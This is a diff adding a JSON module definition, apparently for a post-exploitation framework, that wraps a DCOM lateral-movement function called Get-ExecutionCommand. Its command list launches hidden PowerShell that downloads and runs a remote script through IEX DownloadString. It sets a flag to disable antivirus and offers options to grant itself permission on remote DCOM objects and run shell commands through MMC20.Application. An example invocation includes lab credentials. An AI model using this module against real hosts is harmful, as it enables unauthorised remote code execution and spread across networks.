@@ -1,0 +1,51 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Get-ExecutionCommand",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Nimrod Levy (@el3ct71k)"],
+    "path": ["windows", "x64", "powershell", "lateral", "dcom", "Get-ExecutionCommand.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": false,
+    "notes": "\r\n\r\nGet-ExecutionCommand is part of the D(COM) V(ulnerability) S(canner) (DVS) Framework at https://github.com/ScorpionesLabs/DVS.\r\n\r\nExample:\r\nChecks if the principal-identity is granted to interact with {00020812-0000-0000-C000-000000000046} CLSID object through 10.211.55.4 ip address using lab\\administrator credentials, then it will generates the execution command.\r\n",
+    "remote": "https://raw.githubusercontent.com/ScorpionesLabs/DVS/master/DVS.psm1\r\nPS> Get-ExecutionCommand -ObjectName \"{00020812-0000-0000-C000-000000000046}\" -ObjectPath \"DDEInitiate\" -HostList \"10.211.55.4\" -Username \"lab\\Administrator\" -Password \"Aa123456!\" -Verbose",
+    "local": ["data", "src", "ScorpionesLabs", "DVS", "DVS.psm1"],
+    "options": [
+      {"name": "ObjectName", "value": "MMC20.Application", "required": true, "flag": "-ObjectName", "description":"Specifies the exact DCOM Object to launch."},
+      {"name": "ObjectPath", "value": "Document.ActiveView.ExecuteShellCommand", "required": true, "flag": "-ObjectPath", "description":"Specifies the exact object path of the DCOM object (e.g. ActiveView.ExecuteShellCommand)."},
+      {"name": "HostList", "value": null, "required": false, "flag": "-HostList", "description":"Specifies IPAddresses, CIDR ranges or hostnames to interact with (Default: 127.0.0.1)."},
+      {"name": "Username", "value": null, "required": false, "flag": "-Username", "description":"Specifies the username to use for access."},
+      {"name": "Password", "value": null, "required": false, "flag": "-Password", "description":"Specifies the password to use for access."},
+      {"name": "AutoGrant", "value": null, "required": false, "flag": "-AutoGrant", "description":"AutoGrant mode allows you to grant yourself permission to the remote DCOM object."},
+      {"name": "SkipPermissionChecks", "value": null, "required": false, "flag": "-SkipPermissionChecks", "description":"Try to blindly launch the remote object, without checking if the principal-identity have access to it using (Will not analyze ACL permissions)."},
+      {"name": "SkipRegAuth", "value": null, "required": false, "flag": "-SkipRegAuth", "description":""},
+      {"name": "Verbose", "value": null, "required": false, "flag": "-Verbose", "description":"Get Verbose logging"}
+    ],
+    "description": "Get-ExecutionCommand function allows to generate a PowerShell payload that will interact and execute with the remote DCOM function with the relevant parameters.",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w", "0",
+      "\"IEX",
+      "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ScorpionesLabs/DVS/master/DVS.psm1');",
+      "Get-ExecutionCommand",
+      "{{ObjectName}}",
+      "{{ObjectPath}}",
+      "{{HostList}}",
+      "{{Username}}",
+      "{{Password}}",
+      "{{AutoGrant.Flag}}",
+      "{{SkipPermissionChecks.Flag}}",
+      "{{SkipRegAuth.Flag}}",
+      "{{Verbose.Flag}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": true,
+    "obfuscate": false,
+    "base64": false
+  }
+}
